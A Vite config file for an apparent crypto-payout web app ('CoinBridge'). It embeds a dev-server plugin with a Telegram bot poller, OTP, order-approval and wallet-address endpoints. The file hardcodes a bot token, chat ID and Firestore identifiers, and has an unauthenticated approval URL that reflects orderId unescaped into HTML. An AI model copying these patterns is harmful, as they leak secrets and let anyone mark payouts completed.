import path from 'path';
import react from '@vitejs/plugin-react';
import tailwindcss from '@tailwindcss/vite';
import { defineConfig, type Plugin } from 'vite';
import { sendOtpEmail, verifyOtp } from './src/otpService';

function startTelegramServerPoller() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || '8902295031:AAGtVjefjgl2pcA0NAn0U-7u1muR6n9dZLg';
  const projectId = 'gen-lang-client-0643811231';
  const databaseId = 'ai-studio-googlesigninwebs-09d68219-80be-416e-ab89-41ce6428a9a0';
  let lastProcessedUpdateId = 0;
  let isPolling = false;

  const poll = async () => {
    if (isPolling) return;
    isPolling = true;
    try {
      const offsetParam = lastProcessedUpdateId
        ? `?offset=${lastProcessedUpdateId + 1}&limit=20`
        : '?limit=20';
      const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates${offsetParam}`);
      if (!res.ok) {
        isPolling = false;
        return;
      }
      const data = (await res.json()) as any;
      if (!data.ok || !Array.isArray(data.result)) {
        isPolling = false;
        return;
      }

      for (const update of data.result) {
        if (update.update_id > lastProcessedUpdateId) {
          lastProcessedUpdateId = update.update_id;
        }

        if (update.callback_query) {
          const query = update.callback_query;
          const callbackData = query.data || '';

          if (callbackData.startsWith('approve_') || callbackData.startsWith('appr_')) {
            const orderId = callbackData.replace('approve_', '').replace('appr_', '').trim();

            // 1. Answer Telegram callback immediately
            try {
              await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: query.id,
                  text: '🎉 Payout Marked as Completed! Customer screen updated.',
                  show_alert: false,
                }),
              });
            } catch (e) {
              console.warn('Server Telegram answerCallbackQuery note:', e);
            }

            // 2. Edit Telegram message reply markup
            if (query.message?.chat?.id && query.message?.message_id) {
              try {
                await fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: query.message.chat.id,
                    message_id: query.message.message_id,
                    reply_markup: {
                      inline_keyboard: [
                        [
                          {
                            text: '✅ Payout Sent & Completed on Website',
                            callback_data: 'done',
                          },
                        ],
                      ],
                    },
                  }),
                });
              } catch (e) {
                console.warn('Server Telegram editMessageReplyMarkup note:', e);
              }
            }

            // 3. Update Firestore document directly via REST API so it reflects everywhere
            const completedTime = new Date().toISOString();
            const restPatchUrl = `https://firestore.googleapis.com/v1/projects/${projectId}/databases/${databaseId}/documents/payout_orders/${orderId}?updateMask.fieldPaths=status&updateMask.fieldPaths=completedAt`;

            try {
              await fetch(restPatchUrl, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  fields: {
                    status: { stringValue: 'completed' },
                    completedAt: { stringValue: completedTime },
                  },
                }),
              });
            } catch (patchErr) {
              console.warn('Server REST API patch note:', patchErr);
            }
          }
        }
      }
    } catch {
      // ignore
    } finally {
      isPolling = false;
    }
  };

  setInterval(poll, 1500);
}

let serverPollerStarted = false;

function otpApiPlugin(): Plugin {
  return {
    name: 'otp-api-plugin',
    configureServer(server) {
      if (!serverPollerStarted) {
        serverPollerStarted = true;
        startTelegramServerPoller();
      }

      server.middlewares.use(async (req, res, next) => {
        if (
          !req.url?.startsWith('/api/auth/') &&
          !req.url?.startsWith('/api/telegram/') &&
          !req.url?.startsWith('/api/orders/') &&
          !req.url?.startsWith('/api/blockchain/')
        ) {
          return next();
        }

        const parseBody = (): Promise<any> => {
          return new Promise((resolve) => {
            let body = '';
            req.on('data', (chunk) => {
              body += chunk;
            });
            req.on('end', () => {
              try {
                resolve(body ? JSON.parse(body) : {});
              } catch {
                resolve({});
              }
            });
          });
        };

        if (req.method === 'POST' && req.url === '/api/auth/send-code') {
          try {
            const body = await parseBody();
            const email = body.email;
            if (!email || typeof email !== 'string') {
              res.statusCode = 400;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({ success: false, error: 'Please enter a valid email address.' }));
              return;
            }

            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            if (!emailRegex.test(email.trim())) {
              res.statusCode = 400;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({ success: false, error: 'Invalid email address format. Please enter a valid email.' }));
              return;
            }

            const result = await sendOtpEmail(email);
            res.statusCode = 200;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({
              success: true,
              message: result.isRealSmtp
                ? `Verification code dispatched to your Gmail inbox: ${email}`
                : `Verification code generated for ${email}`,
              isRealSmtp: result.isRealSmtp,
              devCode: result.isRealSmtp ? null : result.code,
            }));
            return;
          } catch (err: any) {
            console.error('Error in /api/auth/send-code:', err);
            res.statusCode = 500;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ success: false, error: 'Failed to send verification code. ' + (err?.message || '') }));
            return;
          }
        }

        if (req.method === 'POST' && req.url === '/api/auth/verify-code') {
          try {
            const body = await parseBody();
            const { email, code } = body;
            if (!email || !code) {
              res.statusCode = 400;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({ success: false, error: 'Email and verification code are required.' }));
              return;
            }

            const result = verifyOtp(email, code);
            if (!result.success) {
              res.statusCode = 400;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify(result));
              return;
            }

            res.statusCode = 200;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({
              success: true,
              email: result.email,
              verifiedAt: new Date().toISOString(),
            }));
            return;
          } catch (err: any) {
            res.statusCode = 500;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ success: false, error: err?.message || 'Verification failed.' }));
            return;
          }
        }

        if (req.method === 'POST' && req.url === '/api/blockchain/scan-order') {
          try {
            const body = await parseBody();
            const { network } = body;
            const targetAddress =
              network === 'bnb'
                ? '0x615EB207eA3570D17801A03253FFd52bf3fdbD07'
                : network === 'solana'
                ? '4VhfHPD8R89VD6QqWurKMen4oVGNKHSGCrbP1WkqpxFj'
                : '0xE6501e2c54B52ad456ceb1cC6Cc5f096beC76302';

            res.statusCode = 200;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ success: true, targetAddress }));
            return;
          } catch (err: any) {
            res.statusCode = 500;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ success: false, error: err?.message }));
            return;
          }
        }

        if (req.method === 'POST' && req.url === '/api/telegram/send-order-alert') {
          try {
            const body = await parseBody();
            const message = body.message || 'New order alert';
            const botToken = process.env.TELEGRAM_BOT_TOKEN || '8902295031:AAGtVjefjgl2pcA0NAn0U-7u1muR6n9dZLg';
            const chatId = process.env.TELEGRAM_CHAT_ID || '7680097351';

            const payload: any = {
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown',
              disable_web_page_preview: true,
            };
            if (body.reply_markup) {
              payload.reply_markup = body.reply_markup;
            }

            const tgResp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
            });
            const tgData = (await tgResp.json()) as any;
            res.statusCode = 200;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ success: !!tgData.ok, data: tgData }));
            return;
          } catch (err: any) {
            console.error('Error sending Telegram alert:', err);
            res.statusCode = 500;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ success: false, error: err?.message || 'Failed to send alert' }));
            return;
          }
        }

        if (req.url?.startsWith('/api/orders/approve')) {
          try {
            const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
            const orderId = parsedUrl.searchParams.get('orderId');

            if (!orderId) {
              res.statusCode = 400;
              res.setHeader('Content-Type', 'text/html; charset=utf-8');
              res.end('<h3>Error: Missing orderId</h3>');
              return;
            }

            const botToken = process.env.TELEGRAM_BOT_TOKEN || '8902295031:AAGtVjefjgl2pcA0NAn0U-7u1muR6n9dZLg';
            const chatId = process.env.TELEGRAM_CHAT_ID || '7680097351';
            const projectId = 'gen-lang-client-0643811231';
            const databaseId = 'ai-studio-googlesigninwebs-09d68219-80be-416e-ab89-41ce6428a9a0';
            const completedTime = new Date().toISOString();
            const restPatchUrl = `https://firestore.googleapis.com/v1/projects/${projectId}/databases/${databaseId}/documents/payout_orders/${orderId}?updateMask.fieldPaths=status&updateMask.fieldPaths=completedAt`;

            try {
              await fetch(restPatchUrl, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  fields: {
                    status: { stringValue: 'completed' },
                    completedAt: { stringValue: completedTime },
                  },
                }),
              });
            } catch (patchErr) {
              console.warn('REST API patch note:', patchErr);
            }

            // Notify Telegram Chat that order has been marked completed
            try {
              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `🎉 *Order Completed Successfully!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📋 *Order ID:* \`${orderId}\`\n✅ Payout receipt displayed on website.`,
                  parse_mode: 'Markdown',
                }),
              });
            } catch (tgErr) {
              console.warn('Could not send approval confirmation to Telegram:', tgErr);
            }

            res.statusCode = 200;
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.end(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Order Approved - CoinBridge</title>
  <style>
    body { font-family: system-ui, -apple-system, sans-serif; background: #0F172A; color: #fff; margin: 0; padding: 24px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { background: #1E293B; border: 1px solid #334155; border-radius: 28px; padding: 32px 24px; max-width: 440px; width: 100%; text-align: center; }
    .icon { width: 72px; height: 72px; border-radius: 50%; background: #10B981; color: white; display: flex; align-items: center; justify-content: center; font-size: 36px; margin: 0 auto 16px; }
    h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; color: #F8FAFC; }
    p { font-size: 14px; color: #94A3B8; line-height: 1.6; margin: 0 0 20px; }
    .order-box { background: #0F172A; border: 1px solid #334155; border-radius: 16px; padding: 14px; font-family: monospace; font-size: 14px; color: #38BDF8; margin-bottom: 24px; }
    .btn { display: inline-block; width: 100%; box-sizing: border-box; background: #7C3AED; color: white; text-decoration: none; padding: 14px; border-radius: 16px; font-weight: 600; cursor: pointer; }
    .btn:hover { background: #6D28D9; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">✓</div>
    <h1>Payment Successfully Completed!</h1>
    <p>The order has been approved. The customer's website screen is now displaying the live completion receipt.</p>
    <div class="order-box">Order ID: ${orderId}</div>
    <a href="javascript:window.close()" class="btn">Close Window</a>
  </div>
</body>
</html>`);
            return;
          } catch (err: any) {
            console.error('Error approving order:', err);
            res.statusCode = 500;
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.end(`<h3>Approval error: ${err?.message || 'Unknown'}</h3>`);
            return;
          }
        }

        if (req.method === 'POST' && (req.url === '/api/telegram/webhook' || req.url?.startsWith('/api/telegram/webhook'))) {
          try {
            const body = await parseBody();
            if (body && body.callback_query) {
              const query = body.callback_query;
              const callbackData = query.data || '';
              if (callbackData.startsWith('approve_')) {
                const orderId = callbackData.replace('approve_', '').trim();
                const botToken = process.env.TELEGRAM_BOT_TOKEN || '8902295031:AAGtVjefjgl2pcA0NAn0U-7u1muR6n9dZLg';
                const projectId = 'gen-lang-client-0643811231';
                const databaseId = 'ai-studio-googlesigninwebs-09d68219-80be-416e-ab89-41ce6428a9a0';

                // 1. Answer Telegram query immediately
                await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    callback_query_id: query.id,
                    text: '🎉 Payout Marked as Completed! Customer screen updated.',
                    show_alert: false,
                  }),
                }).catch(() => {});

                // 2. Edit Telegram message reply markup
                if (query.message?.chat?.id && query.message?.message_id) {
                  await fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: query.message.chat.id,
                      message_id: query.message.message_id,
                      reply_markup: {
                        inline_keyboard: [
                          [{ text: '✅ Payout Sent & Completed on Website', callback_data: 'done' }],
                        ],
                      },
                    }),
                  }).catch(() => {});
                }

                // 3. Update Firestore REST API
                const completedTime = new Date().toISOString();
                const restPatchUrl = `https://firestore.googleapis.com/v1/projects/${projectId}/databases/${databaseId}/documents/payout_orders/${orderId}?updateMask.fieldPaths=status&updateMask.fieldPaths=completedAt`;
                await fetch(restPatchUrl, {
                  method: 'PATCH',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    fields: {
                      status: { stringValue: 'completed' },
                      completedAt: { stringValue: completedTime },
                    },
                  }),
                }).catch(() => {});
              }
            }
            res.statusCode = 200;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ ok: true }));
            return;
          } catch (whErr: any) {
            console.error('Webhook error:', whErr);
            res.statusCode = 200;
            res.end(JSON.stringify({ ok: true }));
            return;
          }
        }

        next();
      });
    },
  };
}

export default defineConfig(() => {
  return {
    plugins: [
      react(),
      tailwindcss(),
      otpApiPlugin(),
    ],
    resolve: {
      alias: {
        '@': path.resolve(__dirname, 'src'),
      },
    },
    server: {
      port: 3000,
      host: '0.0.0.0',
      // HMR is disabled in AI Studio via DISABLE_HMR env var.
      // Do not modify—file watching is disabled to prevent flickering during agent edits.
      hmr: process.env.DISABLE_HMR !== 'true',
      // Disable file watching when DISABLE_HMR is true to save CPU during agent edits.
      watch: process.env.DISABLE_HMR === 'true' ? null : {},
    },
    preview: {
      port: 3000,
      host: '0.0.0.0',
    },
  };
});
